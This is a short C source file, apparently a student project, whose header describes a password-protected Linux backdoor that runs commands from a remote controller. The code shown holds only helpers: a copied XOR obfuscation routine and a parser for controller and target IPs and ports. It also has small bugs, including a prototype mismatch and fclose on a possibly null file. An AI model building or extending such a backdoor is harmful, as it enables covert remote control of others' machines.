/*---------------------------------------------------------------------------------------
--      Source File:            backdoor.c
--
--      Functions:              char *xor_encrypt(char *, char *);
--
--      Date:                   October 6, 2014
--
--      Revisions:              (Date and Description)
--                                      
--      Designer:               Cole Rees and David Tran
--                              
--      Programmer:             Cole Rees and David Tran
--
--		This program illustrates the use of the TCP/IP protocol suite being used to create a backdoor 
-- 		on a Linux machine that will take command line commands from an external controller and then 
-- 		return the results to the controller. The backdoor will only respond to the controller that 
-- 		supplies it with the correct password.
--
--
--      To compile the application:
--                      
--            	make clean
--				make
---------------------------------------------------------------------------------------*/

#include "helperFunctions.h"

/*
 * I found this function on stackoverflow in a thread titled
 * "simple XOR algorithm"
 * */
char *xor_encrypt(char *key, char *string, int len)
{
	int i, x, y;
    
    x = len;
    y = strlen(key);
    
    for (i = 0; i < x; ++i)
    {
        string[i] ^= key[(i%y)];
    }
    return string;
}

void get_controller_config(char *filename, AddrInfo *addInfo) 
{
    int ip1;
    int ip2;
    int ip3;
    int ip4;
    
	FILE *file = fopen (filename, "r");
 
	if (file != NULL)
	{ 
		char line[1024];
		int i = 0;
 
		while(fgets(line, sizeof(line), file) != NULL)
		{
			if(line[0] == '#')
				continue;
 
			if (i == 0){
				sscanf(line, "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);
				sprintf(addInfo->SrcHost, "%d.%d.%d.%d", ip1, ip2, ip3, ip4);
			} else if (i == 1){
				sscanf(line, "%d", &addInfo->sport);
			} else if (i == 2){
				sscanf(line, "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);
				sprintf(addInfo->DstHost, "%d.%d.%d.%d", ip1, ip2, ip3, ip4);
			} else if (i == 3){
				sscanf(line, "%d", &addInfo->dport);
			}
 
			i++;
		} // End while
	} // End if file
	
	fclose(file);	 
}

